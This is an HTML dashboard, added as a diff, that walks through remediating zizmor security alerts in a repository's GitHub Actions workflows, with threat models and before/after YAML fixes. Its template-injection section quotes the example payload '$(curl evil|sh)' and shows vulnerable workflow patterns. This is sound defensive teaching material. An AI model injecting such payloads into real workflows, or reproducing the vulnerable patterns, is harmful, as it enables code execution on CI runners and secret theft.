@@ -1,0 +1,447 @@
+<!doctype html>
+<!--
+  ════════════════════════════════════════════════════════════════════════
+  GITHUB ACTIONS HARDENING · zizmor code-scanning remediation
+  OrchestKit playground — USER-STORY PLAYER archetype.
+
+  Conforms to: src/skills/shared/rules/playground-visual-standard.md
+  Persona: cool-glass (developer / security = technical precision).
+  Zero dependencies. Single file. LTR with RTL-ready logical properties.
+
+  Data is REAL: 109 open code-scanning alerts pulled from
+  repos/yonatangross/orchestkit/code-scanning/alerts on 2026-06-20
+  (commit 4fd816314), all emitted by zizmor (added in PR #2535).
+  ════════════════════════════════════════════════════════════════════════
+-->
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>zizmor Remediation · Playground</title>
+<style>
+  /* ── §2 tokens (cool-glass persona, HSL) ───────────────────────────── */
+  :root {
+    --pg-bg: hsl(232 26% 7%);
+    --pg-ink: hsl(220 18% 93%);
+    --pg-muted: hsl(220 12% 64%);
+    --pg-faint: hsl(220 10% 46%);
+    --pg-line: hsl(0 0% 100% / 0.10);
+    --pg-glass: hsl(0 0% 100% / 0.05);
+    --pg-glass-2: hsl(0 0% 100% / 0.08);
+    --pg-glass-edge: hsl(0 0% 100% / 0.18);
+    --pg-accent: hsl(248 84% 68%);        /* indigo primary */
+    --pg-accent-deep: hsl(255 64% 48%);
+    --pg-teal: hsl(168 70% 46%);          /* "after" / safe */
+    --pg-warm: hsl(38 95% 60%);           /* warning sev */
+    --pg-danger: hsl(2 78% 62%);          /* "before" / error sev */
+    --pg-shadow: 0 20px 60px -22px hsl(248 60% 2% / 0.7), 0 4px 12px -6px hsl(248 60% 2% / 0.5);
+    --pg-r-sm: 9px; --pg-r-md: 16px; --pg-r-lg: 24px;
+    --pg-dur-instant: 100ms; --pg-dur-fast: 200ms; --pg-dur-normal: 300ms; --pg-dur-slow: 500ms;
+    --pg-ease: cubic-bezier(.2,.8,.25,1);
+    --pg-font: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Segoe UI", "Inter", system-ui, sans-serif;
+    --pg-mono: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, monospace;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; min-height: 100vh; font-family: var(--pg-font); color: var(--pg-ink);
+    background:
+      radial-gradient(920px 620px at 84% -10%, hsl(248 84% 60% / 0.16), transparent 60%),
+      radial-gradient(800px 600px at 4% 108%, hsl(168 70% 46% / 0.12), transparent 58%),
+      var(--pg-bg);
+    background-attachment: fixed; -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 1080px; margin: 0 auto; padding: 26px 22px 48px; display: flex; flex-direction: column; gap: 16px; }
+
+  /* header */
+  .head { display: flex; align-items: flex-start; gap: 14px; }
+  .logo { width: 46px; height: 46px; border-radius: 14px; flex: none; display: grid; place-items: center; font-size: 23px;
+    background: linear-gradient(145deg, var(--pg-accent), var(--pg-accent-deep)); box-shadow: 0 8px 22px -8px hsl(248 84% 40% / 0.7), inset 0 1px 0 hsl(0 0% 100% / 0.4); }
+  .head h1 { margin: 0; font-size: 20px; letter-spacing: -.3px; }
+  .head p { margin: 4px 0 0; font-size: 13px; color: var(--pg-muted); max-width: 74ch; line-height: 1.55; }
+  .head .right { margin-inline-start: auto; display: flex; gap: 8px; }
+  .toggle { cursor: pointer; font: inherit; font-size: 12px; font-weight: 600; color: var(--pg-muted);
+    background: var(--pg-glass); border: 1px solid var(--pg-line); border-radius: 999px; padding: 7px 13px; }
+  .toggle:hover { color: var(--pg-ink); border-color: var(--pg-glass-edge); }
+
+  .panel { background: var(--pg-glass); border: 1px solid var(--pg-line); border-radius: var(--pg-r-lg);
+    backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); box-shadow: var(--pg-shadow); }
+
+  /* ── scorecard band (tertiary dashboard strip) ─────────────────────── */
+  .score { padding: 18px 20px; display: grid; grid-template-columns: auto 1fr; gap: 22px; align-items: center; }
+  .verdict { display: flex; flex-direction: column; gap: 2px; padding-inline-end: 22px; border-inline-end: 1px solid var(--pg-line); }
+  .verdict .big { font-family: var(--pg-mono); font-size: 34px; font-weight: 700; letter-spacing: -1px; line-height: 1; font-variant-numeric: tabular-nums;
+    background: linear-gradient(120deg, var(--pg-danger), var(--pg-warm)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; }
+  .verdict .arrow0 { color: var(--pg-faint); font-size: 13px; margin: 3px 0; }
+  .verdict .goal { font-family: var(--pg-mono); font-size: 19px; font-weight: 700; color: var(--pg-teal); font-variant-numeric: tabular-nums; }
+  .verdict .lbl { font-size: 10.5px; text-transform: uppercase; letter-spacing: .5px; color: var(--pg-faint); margin-top: 4px; }
+
+  .cats { display: flex; gap: 9px; flex-wrap: wrap; }
+  .cat { cursor: pointer; text-align: start; font: inherit; border-radius: var(--pg-r-md); padding: 11px 13px; min-width: 150px; flex: 1 1 150px;
+    background: var(--pg-glass); border: 1px solid var(--pg-line); transition: transform var(--pg-dur-instant), border-color var(--pg-dur-fast), background var(--pg-dur-fast); }
+  .cat:hover { transform: translateY(-2px); border-color: var(--pg-glass-edge); background: var(--pg-glass-2); }
+  .cat.active { border-color: var(--cat-c, var(--pg-accent)); background: color-mix(in hsl, var(--cat-c, var(--pg-accent)) 14%, transparent); }
+  .cat .ct { font-family: var(--pg-mono); font-size: 22px; font-weight: 700; line-height: 1; font-variant-numeric: tabular-nums; color: var(--cat-c, var(--pg-ink)); }
+  .cat .rn { font-size: 12px; font-weight: 650; margin-top: 5px; letter-spacing: -.1px; }
+  .cat .sv { display: inline-block; margin-top: 6px; font-size: 9.5px; font-weight: 800; letter-spacing: .4px; text-transform: uppercase; padding: 2px 7px; border-radius: 999px; }
+  .sv.error { color: var(--pg-danger); background: hsl(2 78% 62% / 0.15); }
+  .sv.warning { color: var(--pg-warm); background: hsl(38 95% 60% / 0.15); }
+
+  /* ── transport ─────────────────────────────────────────────────────── */
+  .transport { display: flex; gap: 8px; align-items: center; padding: 12px 16px; }
+  .btn { cursor: pointer; font: inherit; font-size: 13px; font-weight: 650; border-radius: 11px; padding: 10px 14px;
+    border: 1px solid var(--pg-line); background: var(--pg-glass); color: var(--pg-ink); transition: transform var(--pg-dur-instant), background var(--pg-dur-fast); }
+  .btn:hover:not(:disabled) { background: var(--pg-glass-2); transform: translateY(-1px); }
+  .btn.primary { background: linear-gradient(145deg, var(--pg-accent), var(--pg-accent-deep)); border-color: transparent; color: hsl(248 40% 96%); box-shadow: 0 10px 26px -12px hsl(248 84% 50% / 0.8); }
+  .btn:disabled { opacity: .4; cursor: not-allowed; transform: none; }
+  .hint { font-size: 12px; color: var(--pg-faint); margin-inline-start: auto; }
+  .hint b { color: var(--pg-muted); font-variant-numeric: tabular-nums; }
+
+  /* ── stage: before → arrow → after + side rail (primary) ───────────── */
+  .stage { padding: 22px; display: grid; grid-template-columns: 1fr 1.5fr; gap: 22px; align-items: start; }
+  @media (max-width: 880px) { .stage { grid-template-columns: 1fr; } }
+
+  .rail { display: flex; flex-direction: column; gap: 14px; }
+  .rail .rtitle { display: flex; align-items: baseline; gap: 9px; }
+  .rail .rtitle .rn { font-size: 18px; font-weight: 700; letter-spacing: -.3px; }
+  .rail .rtitle .rc { font-family: var(--pg-mono); font-size: 12px; color: var(--cat-c, var(--pg-accent)); font-weight: 700; }
+  .rail .ruleid { font-family: var(--pg-mono); font-size: 11.5px; color: var(--pg-faint); margin-top: -8px; }
+
+  .block { border-radius: var(--pg-r-md); padding: 12px 14px; background: var(--pg-glass); border: 1px solid var(--pg-line); }
+  .block .h { font-size: 10.5px; font-weight: 800; letter-spacing: .5px; text-transform: uppercase; color: var(--pg-faint); display: flex; align-items: center; gap: 6px; }
+  .block .t { font-size: 12.5px; line-height: 1.6; color: var(--pg-muted); margin-top: 7px; }
+  .block .t b { color: var(--pg-ink); font-weight: 650; }
+  .block.threat { border-inline-start: 3px solid var(--pg-danger); }
+  .block.arch { border-inline-start: 3px solid var(--pg-teal); }
+
+  .files { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 9px; }
+  .fchip { font-family: var(--pg-mono); font-size: 10.5px; color: var(--pg-muted); background: var(--pg-glass-2); border: 1px solid var(--pg-line); border-radius: 999px; padding: 3px 9px; }
+  .fchip b { color: var(--cat-c, var(--pg-accent)); font-variant-numeric: tabular-nums; }
+
+  /* code diff column */
+  .diff { display: flex; flex-direction: column; gap: 0; }
+  .codeframe { border-radius: var(--pg-r-md); overflow: hidden; border: 1px solid var(--pg-line); background: hsl(232 28% 9%); }
+  .codeframe .cf-head { display: flex; align-items: center; gap: 8px; padding: 9px 13px; font-size: 11px; font-weight: 700; letter-spacing: .3px; }
+  .codeframe.before .cf-head { background: hsl(2 60% 24% / 0.4); color: hsl(2 80% 80%); }
+  .codeframe.after .cf-head { background: hsl(168 60% 22% / 0.4); color: hsl(168 70% 78%); }
+  .cf-head .dot { width: 8px; height: 8px; border-radius: 999px; }
+  .codeframe.before .dot { background: var(--pg-danger); }
+  .codeframe.after .dot { background: var(--pg-teal); }
+  .cf-head .fn { margin-inline-start: auto; font-family: var(--pg-mono); font-weight: 500; color: var(--pg-faint); font-size: 10.5px; }
+  pre { margin: 0; padding: 13px 14px; font-family: var(--pg-mono); font-size: 12px; line-height: 1.62; color: hsl(220 16% 82%); overflow-x: auto; tab-size: 2; }
+  pre::-webkit-scrollbar { height: 7px; } pre::-webkit-scrollbar-thumb { background: var(--pg-glass-edge); border-radius: 99px; }
+  pre .add { display: block; background: hsl(168 70% 46% / 0.13); color: hsl(168 60% 84%); margin: 0 -14px; padding: 0 14px; }
+  pre .del { display: block; background: hsl(2 78% 62% / 0.12); color: hsl(2 70% 82%); margin: 0 -14px; padding: 0 14px; }
+  pre .cm { color: var(--pg-faint); }
+  pre .kw { color: hsl(248 84% 76%); }
+
+  .diff-arrow { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 7px 0; color: var(--pg-faint); font-size: 11px; }
+  .diff-arrow .ar { font-size: 22px; color: var(--pg-teal); }
+  [dir="rtl"] .diff-arrow .ar { transform: scaleX(-1); }
+
+  /* ── copy-prompt bar (tertiary) ────────────────────────────────────── */
+  .promptbar { display: flex; align-items: center; gap: 14px; padding: 14px 16px; }
+  .promptbar .pt { flex: 1; font-family: var(--pg-mono); font-size: 12px; line-height: 1.6; color: hsl(220 16% 80%); }
+  .promptbar .pt b { color: var(--pg-accent); }
+  .copy { flex: none; cursor: pointer; font: inherit; font-weight: 650; font-size: 12.5px; color: hsl(248 40% 96%); border-radius: 11px; padding: 11px 16px; border: 1px solid transparent;
+    background: linear-gradient(145deg, var(--pg-accent), var(--pg-accent-deep)); box-shadow: 0 10px 26px -12px hsl(248 84% 50% / 0.8); }
+  .copy.done { background: var(--pg-glass-2); color: var(--pg-ink); box-shadow: none; border-color: var(--pg-line); }
+
+  .foot { font-size: 11.5px; color: var(--pg-faint); text-align: center; line-height: 1.6; }
+  .foot code { font-family: var(--pg-mono); color: var(--pg-muted); }
+
+  @keyframes swap { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: none; } }
+  .anim { animation: swap var(--pg-dur-normal) var(--pg-ease) both; }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation-duration: .01ms !important; transition-duration: .01ms !important; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="head">
+    <div class="logo">🛡️</div>
+    <div>
+      <h1>GitHub Actions Hardening — zizmor remediation</h1>
+      <p><b style="color:var(--pg-ink)">109 open code-scanning alerts</b>, all from <b style="color:var(--pg-ink)">zizmor</b>
+         (the Actions security linter added in PR #2535), across 34 workflow files in 5 rule classes.
+         Every one is fixable with a standard hardening pattern. Step the player to see the
+         <b style="color:var(--pg-danger)">before</b> → <b style="color:var(--pg-teal)">after</b> and the
+         <i>proper architecture</i> — not just the mechanical line.</p>
+    </div>
+    <div class="right"><button class="toggle" id="dirToggle" aria-pressed="false">⇄ RTL</button></div>
+  </header>
+
+  <!-- scorecard band -->
+  <section class="panel score">
+    <div class="verdict">
+      <div class="big" id="vNow">109</div>
+      <div class="arrow0">▼ remediate</div>
+      <div class="goal" id="vGoal">0</div>
+      <div class="lbl">open → target</div>
+    </div>
+    <div class="cats" id="cats" role="tablist" aria-label="rule classes"></div>
+  </section>
+
+  <!-- transport -->
+  <div class="panel transport">
+    <button class="btn" id="prev">‹ Prev</button>
+    <button class="btn primary" id="play">▶ Tour</button>
+    <button class="btn" id="next">Next ›</button>
+    <span class="hint" id="stepHint"></span>
+  </div>
+
+  <!-- stage -->
+  <main class="panel stage" id="stage"></main>
+
+  <!-- copy-prompt -->
+  <div class="panel promptbar">
+    <div class="pt" id="promptOut"></div>
+    <button class="copy" id="copyBtn">📋 Copy fix instruction</button>
+  </div>
+
+  <p class="foot">
+    Source: <code>gh api repos/yonatangross/orchestkit/code-scanning/alerts</code> · commit <code>4fd816314</code> · 2026-06-20 ·
+    severity split <b style="color:var(--pg-danger)">33 error</b> / <b style="color:var(--pg-warm)">76 warning</b>.
+    Escape hatch for an accepted risk: <code># zizmor: ignore[rule-id]</code> on the line — prefer a real fix.
+  </p>
+</div>
+
+<script>
+/* ═══════════ DATA — real alerts (commit 4fd816314, 2026-06-20) ═════════ */
+const DIGEST = {
+  artipacked: { files: 34, sites: 75 },
+  "template-injection": { files: 10, sites: 18 },
+  "cache-poisoning": { files: 3, sites: 9 },
+  "github-app": { files: 6, sites: 6 },
+  "excessive-permissions": { files: 1, sites: 1 },
+};
+
+/* code rendered from explicit line objects: {t:"a"|"d"|"x", c:"text"}
+   a=added (green), d=deleted (red), x=context. No prefix parsing — YAML
+   list items ("- uses:") never collide with the diff gutter. */
+const CATS = [
+  {
+    rule: "artipacked",
+    name: "Credential persistence",
+    color: "hsl(38 95% 60%)",
+    sev: "warning",
+    sites: 75, fileCount: 34,
+    topFiles: [["ci.yml",16],["plugin-validation.yml",10],["prerelease.yml",4],["publish-hook-contract-npm.yml",4],["+30 more",31]],
+    threat: "`actions/checkout` defaults to <b>persist-credentials: true</b> — it writes the job's GITHUB_TOKEN into <b>.git/config</b>. Any later step that uploads the workspace as an artifact (or archives <b>.git/</b>) ships a live, push-capable token to anyone who can download it. On a public repo, that is the whole internet.",
+    arch: "Default-deny credential persistence. This repo already routes <b>every write through a scoped App token</b> while GITHUB_TOKEN stays read-only — so <b>no CI job needs</b> the checkout-persisted credential. Set <b>persist-credentials: false</b> on all 75 checkouts; re-enable only on a job that genuinely <b>git push</b>es with the default token (there are none here). Pure-additive, zero behavior change — the ideal codemod PR.",
+    before: [
+      { t: "x", c: "- uses: actions/checkout@df4cb1c…  # v6.0.3" },
+    ],
+    after: [
+      { t: "x", c: "- uses: actions/checkout@df4cb1c…  # v6.0.3" },
+      { t: "a", c: "  with:" },
+      { t: "a", c: "    persist-credentials: false" },
+    ],
+    file: "windows-smoke.yml:40",
+    prompt: "Add `persist-credentials: false` under `with:` to every `actions/checkout` step across all 34 workflow files (75 sites). None of these jobs push with the default GITHUB_TOKEN — writes go through the App token — so this is a pure-additive hardening codemod with no behavior change.",
+  },
+  {
+    rule: "template-injection",
+    name: "Shell code injection",
+    color: "hsl(2 78% 62%)",
+    sev: "error",
+    sites: 18, fileCount: 10,
+    topFiles: [["release-video.yml",4],["orchestkit-eval.yml",3],["channel-sync.yml",2],["prerelease.yml",2],["+6 more",7]],
+    threat: "An attacker-controllable <b>${{ … }}</b> expression (PR number, branch name, input, issue title) is interpolated <b>directly into a run: shell</b>. GitHub substitutes the string <i>before</i> the shell parses it, so a crafted value like <b>$(curl evil|sh)</b> executes on the runner — with the token and secrets in scope.",
+    arch: "Never let <b>${{ }}</b> reach the shell parser. Bind the expression to an <b>env:</b> var on the step, then reference it as a quoted shell variable <b>\"$TARGET\"</b>. The value now travels through the environment as opaque data, not source code — the shell can no longer execute it. This is the canonical zizmor-error fix; review each of the 18 sites to confirm the var is quoted at use.",
+    before: [
+      { t: "x", c: "run: |" },
+      { t: "d", c: '  TARGET="${{ github.event.inputs.target || github.event.pull_request.number }}"' },
+      { t: "x", c: '  claude ultrareview "$TARGET" --json > review.json' },
+    ],
+    after: [
+      { t: "a", c: "env:" },
+      { t: "a", c: "  TARGET: ${{ github.event.inputs.target || github.event.pull_request.number }}" },
+      { t: "x", c: "run: |" },
+      { t: "x", c: '  claude ultrareview "$TARGET" --json > review.json' },
+    ],
+    file: "ultrareview.yml:85",
+    prompt: "Fix all 18 `zizmor/template-injection` sites: move each attacker-controllable `${{ github.* }}` expression out of the `run:` block into a step-level `env:` var, and reference it as a quoted `\"$VAR\"`. Verify the variable is quoted at every use. These are error-severity — do them as a reviewed PR, not a blind codemod.",
+  },
+  {
+    rule: "cache-poisoning",
+    name: "Cache → publish bleed",
+    color: "hsl(2 78% 62%)",
+    sev: "error",
+    sites: 9, fileCount: 3,
+    topFiles: [["publish-hook-contract-npm.yml",5],["release-video.yml",3],["release.yml",1]],
+    threat: "All 9 sites are <b>bare</b> <b>actions/setup-node@v6</b> (just <b>node-version</b>) inside <b>publish / release</b> jobs. zizmor flags a <b>cache-capable action on a publish path</b>: if caching were turned on, a cache key writable from a PR or other branch could restore a poisoned <b>node_modules</b> into the <b>signed release artifact</b>. Today none set <b>cache:</b>, so the risk is <b>latent, not live</b> — but the capability sits right on the trust boundary.",
+    arch: "Caching must stay <b>off every publish/release job</b> — these already are, and they install with <b>npm ci</b>, so there is nothing to restore. Two correct resolutions: <b>(A)</b> never add <b>cache:</b> here and record the review with a documented <b>#&nbsp;zizmor: ignore[cache-poisoning]</b> ('no cache; deps via npm ci'); <b>(B)</b> if you want cache speed, enable <b>cache: npm</b> <b>only on non-publishing CI jobs</b>. The anti-pattern is adding <b>cache:</b> to a job that uploads a release. (Shown: option A — the honest accept-and-audit, valid precisely because no cache is set.)",
+    before: [
+      { t: "x", c: "# publish job → uploads a signed release artifact" },
+      { t: "x", c: "- uses: actions/setup-node@48b55a0…  # v6" },
+      { t: "x", c: "  with:" },
+      { t: "x", c: '    node-version: "20"' },
+      { t: "x", c: "- run: npm ci --ignore-scripts" },
+    ],
+    after: [
+      { t: "x", c: "# publish job → uploads a signed release artifact" },
+      { t: "a", c: "- uses: actions/setup-node@48b55a0…  # zizmor: ignore[cache-poisoning]" },
+      { t: "a", c: "  with:                               #   no cache: set — nothing to poison" },
+      { t: "x", c: '    node-version: "20"' },
+      { t: "x", c: "- run: npm ci --ignore-scripts        # clean install, not a cache" },
+    ],
+    file: "publish-hook-contract-npm.yml:70 (+8)",
+    prompt: "The 9 cache-poisoning sites are bare setup-node steps on publish/release jobs — none set `cache:`, so there is no live cache to poison. Resolve each by (A) adding a documented `# zizmor: ignore[cache-poisoning]` on the setup-node line noting 'no cache; deps via npm ci', or (B) if you want caching, add it only to non-publishing CI jobs — never to a job that uploads a release. Do not add `cache:` to these publish jobs.",
+  },
+  {
+    rule: "github-app",
+    name: "Over-privileged App token",
+    color: "hsl(2 78% 62%)",
+    sev: "error",
+    sites: 6, fileCount: 6,
+    topFiles: [["release.yml",1],["prerelease.yml",1],["release-please.yml",1],["channel-sync.yml",1],["+2 more",2]],
+    threat: "<b>actions/create-github-app-token</b> mints a token carrying the App's <b>full installation permissions</b> across <b>every repo</b> the App is installed on. If any later step is compromised, the blast radius is the entire installation — not the one repo and the two verbs the job actually uses.",
+    arch: "Least-privilege at the point of minting. Scope the <b>minted token</b> down to the single repo (<b>owner</b> + <b>repositories</b>) and the exact permission verbs the job exercises (<b>permission-contents</b>, <b>permission-pull-requests</b>, …). The App can stay broad; the token it hands this job cannot. Determine each job's real writes before scoping — 6 mint sites, each reviewed individually.",
+    before: [
+      { t: "x", c: "- uses: actions/create-github-app-token@bcd2ba4…  # v3.2.0" },
+      { t: "x", c: "  with:" },
+      { t: "x", c: "    app-id: ${{ secrets.RELEASE_BOT_APP_ID }}" },
+      { t: "x", c: "    private-key: ${{ secrets.RELEASE_BOT_PRIVATE_KEY }}" },
+    ],
+    after: [
+      { t: "x", c: "- uses: actions/create-github-app-token@bcd2ba4…  # v3.2.0" },
+      { t: "x", c: "  with:" },
+      { t: "x", c: "    app-id: ${{ secrets.RELEASE_BOT_APP_ID }}" },
+      { t: "x", c: "    private-key: ${{ secrets.RELEASE_BOT_PRIVATE_KEY }}" },
+      { t: "a", c: "    owner: ${{ github.repository_owner }}" },
+      { t: "a", c: "    repositories: orchestkit" },
+      { t: "a", c: "    permission-contents: write" },
+      { t: "a", c: "    permission-pull-requests: write" },
+    ],
+    file: "release.yml:37",
+    prompt: "Scope the 6 `actions/create-github-app-token` mint sites: add `owner`, `repositories: orchestkit`, and the minimal `permission-*: write` verbs each job actually uses (inspect each job's pushes/PR/issue writes first). Don't over-grant — match the token to the job, one reviewed change per file.",
+  },
+  {
+    rule: "excessive-permissions",
+    name: "read-all token surface",
+    color: "hsl(248 84% 68%)",
+    sev: "warning",
+    sites: 1, fileCount: 1,
+    topFiles: [["channel-sync.yml",1]],
+    threat: "<b>permissions: read-all</b> grants the workflow's GITHUB_TOKEN <b>every read scope</b> — actions, packages, deployments, security-events — most of which the job never touches. A wider read surface is a wider exfiltration target if a step is compromised.",
+    arch: "Declare explicit least-privilege permissions at the top of every workflow — name only what's used. <b>channel-sync.yml</b> already documents that GITHUB_TOKEN stays read-only and the App token does all writes, so the precise minimal set is <b>contents: read</b>. Replace the blanket grant with the exact scope.",
+    before: [
+      { t: "d", c: "permissions: read-all" },
+    ],
+    after: [
+      { t: "a", c: "permissions:" },
+      { t: "a", c: "  contents: read" },
+    ],
+    file: "channel-sync.yml:24",
+    prompt: "Replace `permissions: read-all` in channel-sync.yml with an explicit least-privilege block (`permissions:\\n  contents: read`). The job's writes already go through the App token, so `contents: read` is the precise minimal scope.",
+  },
+];
+
+/* ── render engine ─────────────────────────────────────────────────── */
+const state = { i: 0, playing: false, rtl: false };
+let timer = null;
+const esc = s => String(s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
+
+/* render one {t,c} code line with a +/- diff gutter and light token coloring.
+   Keyword pass runs BEFORE the comment pass so a keyword inside a trailing
+   comment stays comment-colored. */
+function codeLine(o) {
+  const cls = o.t === "a" ? "add" : o.t === "d" ? "del" : "";
+  const gutter = o.t === "a" ? "+ " : o.t === "d" ? "- " : "  ";
+  const html = esc(o.c)
+    .replace(/\b(uses|with|run|env|permissions|persist-credentials|owner|repositories|node-version|app-id|private-key)\b/g,
+             '<span class="kw">$1</span>')
+    .replace(/(#[^<]*)$/, '<span class="cm">$1</span>');
+  return `<span class="${cls}">${esc(gutter)}${html}</span>`;
+}
+
+function renderCats() {
+  document.getElementById("cats").innerHTML = CATS.map((c, idx) => `
+    <button class="cat ${idx === state.i ? "active" : ""}" style="--cat-c:${c.color}" data-i="${idx}"
+            role="tab" aria-selected="${idx === state.i}">
+      <div class="ct">${c.sites}</div>
+      <div class="rn">${esc(c.name)}</div>
+      <span class="sv ${c.sev}">${c.sev}</span>
+    </button>`).join("");
+  document.querySelectorAll(".cat").forEach(el =>
+    el.addEventListener("click", () => { stop(); state.i = +el.dataset.i; render(); }));
+}
+
+function render() {
+  const c = CATS[state.i];
+  document.documentElement.style.setProperty("--cat-c", c.color);
+  const fileChips = c.topFiles.map(([f, n]) =>
+    `<span class="fchip">${esc(f)} <b>×${n}</b></span>`).join("");
+
+  document.getElementById("stage").innerHTML = `
+    <div class="rail anim">
+      <div class="rtitle"><span class="rn" style="--cat-c:${c.color}">${esc(c.name)}</span>
+        <span class="rc">${c.sites} alerts · ${c.fileCount} file${c.fileCount > 1 ? "s" : ""}</span></div>
+      <div class="ruleid">zizmor/${esc(c.rule)} · ${c.sev}</div>
+      <div class="block threat"><div class="h">⚠ Threat model</div><div class="t">${c.threat}</div></div>
+      <div class="block arch"><div class="h">🏛 Proper architecture</div><div class="t">${c.arch}</div></div>
+      <div class="block"><div class="h">🎯 Blast radius</div><div class="files" style="--cat-c:${c.color}">${fileChips}</div></div>
+    </div>
+    <div class="diff anim">
+      <div class="codeframe before">
+        <div class="cf-head"><span class="dot"></span>BEFORE · vulnerable<span class="fn">${esc(c.file)}</span></div>
+        <pre>${c.before.map(codeLine).join("\n")}</pre>
+      </div>
+      <div class="diff-arrow"><span class="ar">⬇</span><span>harden</span></div>
+      <div class="codeframe after">
+        <div class="cf-head"><span class="dot"></span>AFTER · hardened<span class="fn">${esc(c.rule)} resolved</span></div>
+        <pre>${c.after.map(codeLine).join("\n")}</pre>
+      </div>
+    </div>`;
+
+  document.getElementById("stepHint").innerHTML =
+    `Class <b>${state.i + 1}</b> of <b>${CATS.length}</b> · <b>${c.sites}</b> alerts`;
+  document.getElementById("prev").disabled = state.i <= 0;
+  document.getElementById("next").disabled = state.i >= CATS.length - 1;
+  document.querySelectorAll(".cat").forEach((el, idx) => {
+    el.classList.toggle("active", idx === state.i);
+    el.setAttribute("aria-selected", idx === state.i);
+  });
+  document.getElementById("promptOut").innerHTML =
+    `<b>Fix ${c.sites} × zizmor/${esc(c.rule)}:</b> ${esc(c.prompt)}`;
+}
+
+function stop() { state.playing = false; clearTimeout(timer); document.getElementById("play").innerHTML = "▶ Tour"; }
+function play() {
+  if (state.playing) return stop();
+  state.playing = true; document.getElementById("play").innerHTML = "⏸ Pause";
+  const tick = () => {
+    if (!state.playing) return;
+    if (state.i >= CATS.length - 1) return stop();
+    state.i++; render();
+    timer = setTimeout(tick, 2600);
+  };
+  if (state.i >= CATS.length - 1) state.i = 0;
+  render(); timer = setTimeout(tick, 2600);
+}
+
+document.getElementById("play").addEventListener("click", play);
+document.getElementById("prev").addEventListener("click", () => { stop(); state.i = Math.max(0, state.i - 1); render(); });
+document.getElementById("next").addEventListener("click", () => { stop(); state.i = Math.min(CATS.length - 1, state.i + 1); render(); });
+document.getElementById("dirToggle").addEventListener("click", e => {
+  state.rtl = !state.rtl; document.documentElement.dir = state.rtl ? "rtl" : "ltr"; e.currentTarget.setAttribute("aria-pressed", state.rtl);
+});
+document.getElementById("copyBtn").addEventListener("click", () => {
+  navigator.clipboard.writeText(document.getElementById("promptOut").textContent).then(() => {
+    const b = document.getElementById("copyBtn"); b.textContent = "✓ Copied"; b.classList.add("done");
+    setTimeout(() => { b.textContent = "📋 Copy fix instruction"; b.classList.remove("done"); }, 1500);
+  });
+});
+
+/* keyboard nav on the player */
+document.addEventListener("keydown", e => {
+  if (e.key === "ArrowRight") document.getElementById("next").click();
+  else if (e.key === "ArrowLeft") document.getElementById("prev").click();
+});
+
+renderCats();
+render();
+</script>
+</body>
+</html>
